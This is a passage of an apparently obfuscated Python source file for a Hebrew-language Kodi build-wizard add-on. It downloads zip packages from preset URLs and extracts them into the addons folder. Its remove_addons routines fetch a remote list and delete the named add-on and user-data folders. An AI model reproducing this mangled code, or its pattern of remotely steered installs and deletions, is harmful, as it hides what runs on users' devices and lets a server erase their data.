				DP .close ()#line:5177
				wiz .defaultSkin ()#line:5178
				wiz .lookandFeelData ('save')#line:5179
				if KODIV >=18 :#line:5180
					skindialogsettind18 ()#line:5181
				if INSTALLMETHOD ==1 :O000O0OOOOOO0O000 =1 #line:5184
				elif INSTALLMETHOD ==2 :O000O0OOOOOO0O000 =0 #line:5185
				else :DP .close ()#line:5186
def gaiaserenaddon ():#line:5188
  OO000OOOOO0OO0OO0 =(ADDON .getSetting ("gaiaseren"))#line:5189
  OO00OO0O0OOO00O00 =(ADDON .getSetting ("auto_rd"))#line:5190
  if OO000OOOOO0OO0OO0 =='true'and OO00OO0O0OOO00O00 =='true':#line:5191
    OO0O000O0OO000OO0 =(NEWFASTUPDATE )#line:5192
    O0OO000OO0000OOO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5193
    O000OOOO0OOOOO0O0 =xbmcgui .DialogProgress ()#line:5194
    O000OOOO0OOOOO0O0 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5195
    O000OOOOOOOO0OOO0 =os .path .join (PACKAGES ,'isr.zip')#line:5196
    OO000O0OO0OO0000O =urllib2 .Request (OO0O000O0OO000OO0 )#line:5197
    OOOOOO0O00O0O0O0O =urllib2 .urlopen (OO000O0OO0OO0000O )#line:5198
    O000O0O0OO0OO0000 =xbmcgui .DialogProgress ()#line:5200
    O000O0O0OO0OO0000 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5201
    O000O0O0OO0OO0000 .update (0 )#line:5202
    O0OOOOOO000O0OOOO =open (O000OOOOOOOO0OOO0 ,'wb')#line:5204
    try :#line:5206
      O0OOO0OO0O0OOO000 =OOOOOO0O00O0O0O0O .info ().getheader ('Content-Length').strip ()#line:5207
      OOO0OO0O000O0O0OO =True #line:5208
    except AttributeError :#line:5209
          OOO0OO0O000O0O0OO =False #line:5210
    if OOO0OO0O000O0O0OO :#line:5212
          O0OOO0OO0O0OOO000 =int (O0OOO0OO0O0OOO000 )#line:5213
    OOO000OO0OO0OOOO0 =0 #line:5215
    OOOO0O000OOO0O0O0 =time .time ()#line:5216
    while True :#line:5217
          O000O0OO0000O0OOO =OOOOOO0O00O0O0O0O .read (8192 )#line:5218
          if not O000O0OO0000O0OOO :#line:5219
              sys .stdout .write ('\n')#line:5220
              break #line:5221
          OOO000OO0OO0OOOO0 +=len (O000O0OO0000O0OOO )#line:5223
          O0OOOOOO000O0OOOO .write (O000O0OO0000O0OOO )#line:5224
          if not OOO0OO0O000O0O0OO :#line:5226
              O0OOO0OO0O0OOO000 =OOO000OO0OO0OOOO0 #line:5227
          if O000O0O0OO0OO0000 .iscanceled ():#line:5228
             O000O0O0OO0OO0000 .close ()#line:5229
             try :#line:5230
              os .remove (O000OOOOOOOO0OOO0 )#line:5231
             except :#line:5232
              pass #line:5233
             break #line:5234
          O0O00000000000OOO =float (OOO000OO0OO0OOOO0 )/O0OOO0OO0O0OOO000 #line:5235
          O0O00000000000OOO =round (O0O00000000000OOO *100 ,2 )#line:5236
          O0O0OO0OO00O00OO0 =OOO000OO0OO0OOOO0 /(1024 *1024 )#line:5237
          O00O0O00OO0000OO0 =O0OOO0OO0O0OOO000 /(1024 *1024 )#line:5238
          OO00O0O0O0O00O0O0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0O0OO0OO00O00OO0 ,'teal',O00O0O00OO0000OO0 )#line:5239
          if (time .time ()-OOOO0O000OOO0O0O0 )>0 :#line:5240
            O0OOO000000OOOOOO =OOO000OO0OO0OOOO0 /(time .time ()-OOOO0O000OOO0O0O0 )#line:5241
            O0OOO000000OOOOOO =O0OOO000000OOOOOO /1024 #line:5242
          else :#line:5243
           O0OOO000000OOOOOO =0 #line:5244
          OO000O0O00OO00O0O ='KB'#line:5245
          if O0OOO000000OOOOOO >=1024 :#line:5246
             O0OOO000000OOOOOO =O0OOO000000OOOOOO /1024 #line:5247
             OO000O0O00OO00O0O ='MB'#line:5248
          if O0OOO000000OOOOOO >0 and not O0O00000000000OOO ==100 :#line:5249
              O0OO00OO0O0O0000O =(O0OOO0OO0O0OOO000 -OOO000OO0OO0OOOO0 )/O0OOO000000OOOOOO #line:5250
          else :#line:5251
              O0OO00OO0O0O0000O =0 #line:5252
          OOOOOOO00O000000O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OOO000000OOOOOO ,OO000O0O00OO00O0O )#line:5253
          O000O0O0OO0OO0000 .update (int (O0O00000000000OOO ),OO00O0O0O0O00O0O0 ,OOOOOOO00O000000O +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5255
    O0OO0000OO0O00OOO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5258
    O0OOOOOO000O0OOOO .close ()#line:5261
    extract .all (O000OOOOOOOO0OOO0 ,O0OO0000OO0O00OOO ,O000O0O0OO0OO0000 )#line:5262
    try :#line:5266
      os .remove (O000OOOOOOOO0OOO0 )#line:5267
    except :#line:5268
      pass #line:5269
def iptvsimpldownpc ():#line:5270
    OO00O00000O00OO00 =(IPTVSIMPL18PC )#line:5272
    OO000O0O0O000000O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5273
    O000OOO00000O00O0 =xbmcgui .DialogProgress ()#line:5274
    O000OOO00000O00O0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5275
    O000OOO0OO00O0000 =os .path .join (PACKAGES ,'isr.zip')#line:5276
    OO0O00OO00000000O =urllib2 .Request (OO00O00000O00OO00 )#line:5277
    O0000O0O0O0O0OO00 =urllib2 .urlopen (OO0O00OO00000000O )#line:5278
    OO00OOO0OO00O0000 =xbmcgui .DialogProgress ()#line:5280
    OO00OOO0OO00O0000 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5281
    OO00OOO0OO00O0000 .update (0 )#line:5282
    OO0OOO00O00O0OO0O =open (O000OOO0OO00O0000 ,'wb')#line:5284
    try :#line:5286
      O00OO0O00O0OO00OO =O0000O0O0O0O0OO00 .info ().getheader ('Content-Length').strip ()#line:5287
      O0OO00OOOO0O0O0O0 =True #line:5288
    except AttributeError :#line:5289
          O0OO00OOOO0O0O0O0 =False #line:5290
    if O0OO00OOOO0O0O0O0 :#line:5292
          O00OO0O00O0OO00OO =int (O00OO0O00O0OO00OO )#line:5293
    O0O0O0OOO0O00OOO0 =0 #line:5295
    O00OOO00OO00O0000 =time .time ()#line:5296
    while True :#line:5297
          O00O0O0OO00O0O000 =O0000O0O0O0O0OO00 .read (8192 )#line:5298
          if not O00O0O0OO00O0O000 :#line:5299
              sys .stdout .write ('\n')#line:5300
              break #line:5301
          O0O0O0OOO0O00OOO0 +=len (O00O0O0OO00O0O000 )#line:5303
          OO0OOO00O00O0OO0O .write (O00O0O0OO00O0O000 )#line:5304
          if not O0OO00OOOO0O0O0O0 :#line:5306
              O00OO0O00O0OO00OO =O0O0O0OOO0O00OOO0 #line:5307
          if OO00OOO0OO00O0000 .iscanceled ():#line:5308
             OO00OOO0OO00O0000 .close ()#line:5309
             try :#line:5310
              os .remove (O000OOO0OO00O0000 )#line:5311
             except :#line:5312
              pass #line:5313
             break #line:5314
          O0OO00000OO00OO00 =float (O0O0O0OOO0O00OOO0 )/O00OO0O00O0OO00OO #line:5315
          O0OO00000OO00OO00 =round (O0OO00000OO00OO00 *100 ,2 )#line:5316
          O0OOOO00O00OOO000 =O0O0O0OOO0O00OOO0 /(1024 *1024 )#line:5317
          OO000OOOO0OO000OO =O00OO0O00O0OO00OO /(1024 *1024 )#line:5318
          O0O0OO0OO0O000OOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OOOO00O00OOO000 ,'teal',OO000OOOO0OO000OO )#line:5319
          if (time .time ()-O00OOO00OO00O0000 )>0 :#line:5320
            OO00O0O0000O0OO0O =O0O0O0OOO0O00OOO0 /(time .time ()-O00OOO00OO00O0000 )#line:5321
            OO00O0O0000O0OO0O =OO00O0O0000O0OO0O /1024 #line:5322
          else :#line:5323
           OO00O0O0000O0OO0O =0 #line:5324
          OO0O0OOOO00OO000O ='KB'#line:5325
          if OO00O0O0000O0OO0O >=1024 :#line:5326
             OO00O0O0000O0OO0O =OO00O0O0000O0OO0O /1024 #line:5327
             OO0O0OOOO00OO000O ='MB'#line:5328
          if OO00O0O0000O0OO0O >0 and not O0OO00000OO00OO00 ==100 :#line:5329
              O000000000O000OO0 =(O00OO0O00O0OO00OO -O0O0O0OOO0O00OOO0 )/OO00O0O0000O0OO0O #line:5330
          else :#line:5331
              O000000000O000OO0 =0 #line:5332
          O0OO0OO0000OO00O0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO00O0O0000O0OO0O ,OO0O0OOOO00OO000O )#line:5333
          OO00OOO0OO00O0000 .update (int (O0OO00000OO00OO00 ),O0O0OO0OO0O000OOO ,O0OO0OO0000OO00O0 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5335
    OOO0O00OO00000OOO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5338
    OO0OOO00O00O0OO0O .close ()#line:5341
    extract .all (O000OOO0OO00O0000 ,OOO0O00OO00000OOO ,OO00OOO0OO00O0000 )#line:5342
    try :#line:5346
      os .remove (O000OOO0OO00O0000 )#line:5347
    except :#line:5348
      pass #line:5349
def iptvsimpldown ():#line:5350
    O0OOOOOO0OO0OO00O =(IPTV18 )#line:5352
    OOOO000O000O0OO00 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5353
    O0O00O00000O0OO0O =xbmcgui .DialogProgress ()#line:5354
    O0O00O00000O0OO0O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5355
    O0O0000OO00O0O000 =os .path .join (PACKAGES ,'isr.zip')#line:5356
    O0000OOOO00OO0OO0 =urllib2 .Request (O0OOOOOO0OO0OO00O )#line:5357
    OO00O0O0OO0OOOO0O =urllib2 .urlopen (O0000OOOO00OO0OO0 )#line:5358
    OOOO0O0OOO00OO0O0 =xbmcgui .DialogProgress ()#line:5360
    OOOO0O0OOO00OO0O0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5361
    OOOO0O0OOO00OO0O0 .update (0 )#line:5362
    O0OOO00O00OOOO0O0 =open (O0O0000OO00O0O000 ,'wb')#line:5364
    try :#line:5366
      O0O0O0O0O00000OOO =OO00O0O0OO0OOOO0O .info ().getheader ('Content-Length').strip ()#line:5367
      OOOOO0O0OOO00OO0O =True #line:5368
    except AttributeError :#line:5369
          OOOOO0O0OOO00OO0O =False #line:5370
    if OOOOO0O0OOO00OO0O :#line:5372
          O0O0O0O0O00000OOO =int (O0O0O0O0O00000OOO )#line:5373
    OO0OO000OO0O0O00O =0 #line:5375
    OOOOOO0O00O0OO000 =time .time ()#line:5376
    while True :#line:5377
          OOOO00O0O00OO0OO0 =OO00O0O0OO0OOOO0O .read (8192 )#line:5378
          if not OOOO00O0O00OO0OO0 :#line:5379
              sys .stdout .write ('\n')#line:5380
              break #line:5381
          OO0OO000OO0O0O00O +=len (OOOO00O0O00OO0OO0 )#line:5383
          O0OOO00O00OOOO0O0 .write (OOOO00O0O00OO0OO0 )#line:5384
          if not OOOOO0O0OOO00OO0O :#line:5386
              O0O0O0O0O00000OOO =OO0OO000OO0O0O00O #line:5387
          if OOOO0O0OOO00OO0O0 .iscanceled ():#line:5388
             OOOO0O0OOO00OO0O0 .close ()#line:5389
             try :#line:5390
              os .remove (O0O0000OO00O0O000 )#line:5391
             except :#line:5392
              pass #line:5393
             break #line:5394
          O00O00O0O0O00OO00 =float (OO0OO000OO0O0O00O )/O0O0O0O0O00000OOO #line:5395
          O00O00O0O0O00OO00 =round (O00O00O0O0O00OO00 *100 ,2 )#line:5396
          OO0O00O0OO000O000 =OO0OO000OO0O0O00O /(1024 *1024 )#line:5397
          OO00O0O0OO00000O0 =O0O0O0O0O00000OOO /(1024 *1024 )#line:5398
          O00OOO0O000OOOOOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0O00O0OO000O000 ,'teal',OO00O0O0OO00000O0 )#line:5399
          if (time .time ()-OOOOOO0O00O0OO000 )>0 :#line:5400
            O00O0O0O0OO0O00OO =OO0OO000OO0O0O00O /(time .time ()-OOOOOO0O00O0OO000 )#line:5401
            O00O0O0O0OO0O00OO =O00O0O0O0OO0O00OO /1024 #line:5402
          else :#line:5403
           O00O0O0O0OO0O00OO =0 #line:5404
          OOOO00000OOO0OO00 ='KB'#line:5405
          if O00O0O0O0OO0O00OO >=1024 :#line:5406
             O00O0O0O0OO0O00OO =O00O0O0O0OO0O00OO /1024 #line:5407
             OOOO00000OOO0OO00 ='MB'#line:5408
          if O00O0O0O0OO0O00OO >0 and not O00O00O0O0O00OO00 ==100 :#line:5409
              OO000O00O00O00O00 =(O0O0O0O0O00000OOO -OO0OO000OO0O0O00O )/O00O0O0O0OO0O00OO #line:5410
          else :#line:5411
              OO000O00O00O00O00 =0 #line:5412
          OOO0OOO000OO000OO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00O0O0O0OO0O00OO ,OOOO00000OOO0OO00 )#line:5413
          OOOO0O0OOO00OO0O0 .update (int (O00O00O0O0O00OO00 ),O00OOO0O000OOOOOO ,OOO0OOO000OO000OO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5415
    O000OO000O0OO0000 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5418
    O0OOO00O00OOOO0O0 .close ()#line:5421
    extract .all (O0O0000OO00O0O000 ,O000OO000O0OO0000 ,OOOO0O0OOO00OO0O0 )#line:5422
    try :#line:5426
      os .remove (O0O0000OO00O0O000 )#line:5427
    except :#line:5428
      pass #line:5429
def testnotify ():#line:5430
	OO0OOO0000OOOO00O =wiz .workingURL (NOTIFICATION )#line:5431
	if OO0OOO0000OOOO00O ==True :#line:5432
		try :#line:5433
			OOOO000O0OOOOO00O ,OO0OO000O0OO0O000 =wiz .splitNotify (NOTIFICATION )#line:5434
			if OOOO000O0OOOOO00O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5435
			if STARTP2 ()=='ok':#line:5436
				notify .notification (OO0OO000O0OO0O000 ,True )#line:5437
		except Exception as O0OOOO000OO00OOO0 :#line:5438
			wiz .log ("Error on Notifications Window: %s"%str (O0OOOO000OO00OOO0 ),xbmc .LOGERROR )#line:5439
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5440
def testnotify2 ():#line:5441
	OOO000000OO0OO0O0 =wiz .workingURL (NOTIFICATION2 )#line:5442
	if OOO000000OO0OO0O0 ==True :#line:5443
		try :#line:5444
			OOOO00OOO00000000 ,O0O0OOOO00OOO0O0O =wiz .splitNotify (NOTIFICATION2 )#line:5445
			if OOOO00OOO00000000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5446
			if STARTP2 ()=='ok':#line:5447
				notify .notification2 (O0O0OOOO00OOO0O0O ,True )#line:5448
		except Exception as OO00O000000000OO0 :#line:5449
			wiz .log ("Error on Notifications Window: %s"%str (OO00O000000000OO0 ),xbmc .LOGERROR )#line:5450
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5451
def testnotify3 ():#line:5452
	O0OO0000O0O0OO0OO =wiz .workingURL (NOTIFICATION3 )#line:5453
	if O0OO0000O0O0OO0OO ==True :#line:5454
		try :#line:5455
			O0OO00O0000OOO0OO ,OO0O0O00OOO0O00OO =wiz .splitNotify (NOTIFICATION3 )#line:5456
			if O0OO00O0000OOO0OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5457
			if STARTP2 ()=='ok':#line:5458
				notify .notification3 (OO0O0O00OOO0O00OO ,True )#line:5459
		except Exception as OOO00O0OOOOO0O0OO :#line:5460
			wiz .log ("Error on Notifications Window: %s"%str (OOO00O0OOOOO0O0OO ),xbmc .LOGERROR )#line:5461
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5462
def servicemanual ():#line:5463
	OOO0OOOOOOOOOO000 =wiz .workingURL (HELPINFO )#line:5464
	if OOO0OOOOOOOOOO000 ==True :#line:5465
		try :#line:5466
			OO0O0O00O0OOOOO00 ,OO0OOOOOO000O00O0 =wiz .splitNotify (HELPINFO )#line:5467
			if OO0O0O00O0OOOOO00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5468
			notify .helpinfo (OO0OOOOOO000O00O0 ,True )#line:5469
		except Exception as O00OOO0OOOOO0OO0O :#line:5470
			wiz .log ("Error on Notifications Window: %s"%str (O00OOO0OOOOO0OO0O ),xbmc .LOGERROR )#line:5471
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5472
def testupdate ():#line:5474
	if BUILDNAME =="":#line:5475
		notify .updateWindow ()#line:5476
	else :#line:5477
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5478
def testfirst ():#line:5480
	notify .firstRun ()#line:5481
def testfirstRun ():#line:5483
	notify .firstRunSettings ()#line:5484
def fastinstall ():#line:5487
	notify .firstRuninstall ()#line:5488
def addDir (OOOO00000OO0O00OO ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5495
	OO0O0O00OO000O00O =sys .argv [0 ]#line:5496
	if not mode ==None :OO0O0O00OO000O00O +="?mode=%s"%urllib .quote_plus (mode )#line:5497
	if not name ==None :OO0O0O00OO000O00O +="&name="+urllib .quote_plus (name )#line:5498
	if not url ==None :OO0O0O00OO000O00O +="&url="+urllib .quote_plus (url )#line:5499
	O0OO00OOOO00OO0OO =True #line:5500
	if themeit :OOOO00000OO0O00OO =themeit %OOOO00000OO0O00OO #line:5501
	O00O0O0O0OO00OOO0 =xbmcgui .ListItem (OOOO00000OO0O00OO ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5502
	O00O0O0O0OO00OOO0 .setInfo (type ="Video",infoLabels ={"Title":OOOO00000OO0O00OO ,"Plot":description })#line:5503
	O00O0O0O0OO00OOO0 .setProperty ("Fanart_Image",fanart )#line:5504
	if not menu ==None :O00O0O0O0OO00OOO0 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5505
	O0OO00OOOO00OO0OO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO0O0O00OO000O00O ,listitem =O00O0O0O0OO00OOO0 ,isFolder =True )#line:5506
	return O0OO00OOOO00OO0OO #line:5507
def addFile (OO000O00O0O0OO0OO ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5509
	OOOO0000O00000000 =sys .argv [0 ]#line:5510
	if not mode ==None :OOOO0000O00000000 +="?mode=%s"%urllib .quote_plus (mode )#line:5511
	if not name ==None :OOOO0000O00000000 +="&name="+urllib .quote_plus (name )#line:5512
	if not url ==None :OOOO0000O00000000 +="&url="+urllib .quote_plus (url )#line:5513
	O0O0000OOO00OOOOO =True #line:5514
	if themeit :OO000O00O0O0OO0OO =themeit %OO000O00O0O0OO0OO #line:5515
	O00OO00O0000O0000 =xbmcgui .ListItem (OO000O00O0O0OO0OO ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5516
	O00OO00O0000O0000 .setInfo (type ="Video",infoLabels ={"Title":OO000O00O0O0OO0OO ,"Plot":description })#line:5517
	O00OO00O0000O0000 .setProperty ("Fanart_Image",fanart )#line:5518
	if not menu ==None :O00OO00O0000O0000 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5519
	O0O0000OOO00OOOOO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOOO0000O00000000 ,listitem =O00OO00O0000O0000 ,isFolder =False )#line:5520
	return O0O0000OOO00OOOOO #line:5521
def get_params ():#line:5523
	O0OO0OO0O0O00O0OO =[]#line:5524
	OO000O000OO00O0O0 =sys .argv [2 ]#line:5525
	if len (OO000O000OO00O0O0 )>=2 :#line:5526
		OO000O00O0OOOO0OO =sys .argv [2 ]#line:5527
		OOO00O00000O0000O =OO000O00O0OOOO0OO .replace ('?','')#line:5528
		if (OO000O00O0OOOO0OO [len (OO000O00O0OOOO0OO )-1 ]=='/'):#line:5529
			OO000O00O0OOOO0OO =OO000O00O0OOOO0OO [0 :len (OO000O00O0OOOO0OO )-2 ]#line:5530
		O0OOOOOO0O00O00OO =OOO00O00000O0000O .split ('&')#line:5531
		O0OO0OO0O0O00O0OO ={}#line:5532
		for OO000O0O0OOO0O00O in range (len (O0OOOOOO0O00O00OO )):#line:5533
			O0000OOOO000OO00O ={}#line:5534
			O0000OOOO000OO00O =O0OOOOOO0O00O00OO [OO000O0O0OOO0O00O ].split ('=')#line:5535
			if (len (O0000OOOO000OO00O ))==2 :#line:5536
				O0OO0OO0O0O00O0OO [O0000OOOO000OO00O [0 ]]=O0000OOOO000OO00O [1 ]#line:5537
		return O0OO0OO0O0O00O0OO #line:5539
def remove_addons ():#line:5541
	try :#line:5542
			import json #line:5543
			O00O0OO0OOO000000 =urllib2 .urlopen (remove_url ).readlines ()#line:5544
			for O00OO0000OOOO000O in O00O0OO0OOO000000 :#line:5545
				O00OOOO000OO0OOOO =O00OO0000OOOO000O .split (':')[1 ].strip ()#line:5547
				OOO0OO0000OO0OOOO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(O00OOOO000OO0OOOO ,'false')#line:5548
				O0000OOO0OO00OO00 =xbmc .executeJSONRPC (OOO0OO0000OO0OOOO )#line:5549
				O0000O0OO0000OO00 =json .loads (O0000OOO0OO00OO00 )#line:5550
				OOOOO00OO0O0OO0O0 =os .path .join (addons_folder ,O00OOOO000OO0OOOO )#line:5552
				if os .path .exists (OOOOO00OO0O0OO0O0 ):#line:5554
					for OOO0O00000O000000 ,O00O0OOO00OO0OOOO ,OOOO000OO00OOO0OO in os .walk (OOOOO00OO0O0OO0O0 ):#line:5555
						for OO0000OOO0OO00OO0 in OOOO000OO00OOO0OO :#line:5556
							os .unlink (os .path .join (OOO0O00000O000000 ,OO0000OOO0OO00OO0 ))#line:5557
						for OO00O00OO0OOOO0O0 in O00O0OOO00OO0OOOO :#line:5558
							shutil .rmtree (os .path .join (OOO0O00000O000000 ,OO00O00OO0OOOO0O0 ))#line:5559
					os .rmdir (OOOOO00OO0O0OO0O0 )#line:5560
			xbmc .executebuiltin ('Container.Refresh')#line:5562
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5563
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5564
	except :pass #line:5565
def remove_addons2 ():#line:5566
	try :#line:5567
			import json #line:5568
			O00O0OOO0O00OO0OO =urllib2 .urlopen (remove_url2 ).readlines ()#line:5569
			for OOOOOO0OOOOOOOOOO in O00O0OOO0O00OO0OO :#line:5570
				O0O000O0O0O0O000O =OOOOOO0OOOOOOOOOO .split (':')[1 ].strip ()#line:5572
				O0O00O0OO00O0O0O0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(O0O000O0O0O0O000O ,'false')#line:5573
				O00OO000O0O0O0000 =xbmc .executeJSONRPC (O0O00O0OO00O0O0O0 )#line:5574
				O000OO0000OO00O0O =json .loads (O00OO000O0O0O0000 )#line:5575
				OO0OO0000O0OO0000 =os .path .join (user_folder ,O0O000O0O0O0O000O )#line:5577
				if os .path .exists (OO0OO0000O0OO0000 ):#line:5579
					for O000O0O0OO00O0O0O ,O0O000OOOO000OOO0 ,OO00OOO00OOO00000 in os .walk (OO0OO0000O0OO0000 ):#line:5580
						for OO00000O0O0O0O000 in OO00OOO00OOO00000 :#line:5581
							os .unlink (os .path .join (O000O0O0OO00O0O0O ,OO00000O0O0O0O000 ))#line:5582
						for OOO0OO0OO0O0O00OO in O0O000OOOO000OOO0 :#line:5583
							shutil .rmtree (os .path .join (O000O0O0OO00O0O0O ,OOO0OO0OO0O0O00OO ))#line:5584
					os .rmdir (OO0OO0000O0OO0000 )#line:5585
	except :pass #line:5587
params =get_params ()#line:5588
url =None #line:5589
name =None #line:5590
mode =None #line:5591
try :mode =urllib .unquote_plus (params ["mode"])#line:5593
except :pass #line:5594
try :name =urllib .unquote_plus (params ["name"])#line:5595
except :pass #line:5596
try :url =urllib .unquote_plus (params ["url"])#line:5597
except :pass #line:5598
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5600
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5601
def setView (O00O0O0OOO0OOOO00 ,OOO00O0OOOO00OOOO ):#line:5602
	if wiz .getS ('auto-view')=='true':#line:5603
		O0O0OOOOO0O0O0O00 =wiz .getS (OOO00O0OOOO00OOOO )#line:5604
		if O0O0OOOOO0O0O0O00 =='50'and KODIV >=17 and SKIN =='skin.estuary':O0O0OOOOO0O0O0O00 ='55'#line:5605
		if O0O0OOOOO0O0O0O00 =='500'and KODIV >=17 and SKIN =='skin.estuary':O0O0OOOOO0O0O0O00 ='50'#line:5606
		wiz .ebi ("Container.SetViewMode(%s)"%O0O0OOOOO0O0O0O00 )#line:5607
if mode ==None :index ()#line:5609
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5611
elif mode =='builds':buildMenu ()#line:5612
elif mode =='viewbuild':viewBuild (name )#line:5613
elif mode =='buildinfo':buildInfo (name )#line:5614
elif mode =='buildpreview':buildVideo (name )#line:5615
elif mode =='install':buildWizard (name ,url )#line:5616
elif mode =='theme':buildWizard (name ,mode ,url )#line:5617
elif mode =='viewthirdparty':viewThirdList (name )#line:5618
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5619
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5620
elif mode =='maint':maintMenu (name )#line:5622
elif mode =='passpin':passandpin ()#line:5623
elif mode =='backmyupbuild':backmyupbuild ()#line:5624
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5625
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5626
elif mode =='advancedsetting':advancedWindow (name )#line:5627
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5628
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5629
elif mode =='asciicheck':wiz .asciiCheck ()#line:5630
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5631
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5632
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5633
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5634
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5635
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5636
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5637
elif mode =='currentsettings':viewAdvanced ()#line:5638
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5639
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5640
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5641
elif mode =='fixskin':backtokodi ()#line:5642
elif mode =='testcommand':testcommand ()#line:5643
elif mode =='logsend':logsend ()#line:5644
elif mode =='rdon':rdon ()#line:5645
elif mode =='rdoff':rdoff ()#line:5646
elif mode =='setrd':setrealdebrid ()#line:5647
elif mode =='setrd2':setautorealdebrid ()#line:5648
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5649
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5650
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5651
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5652
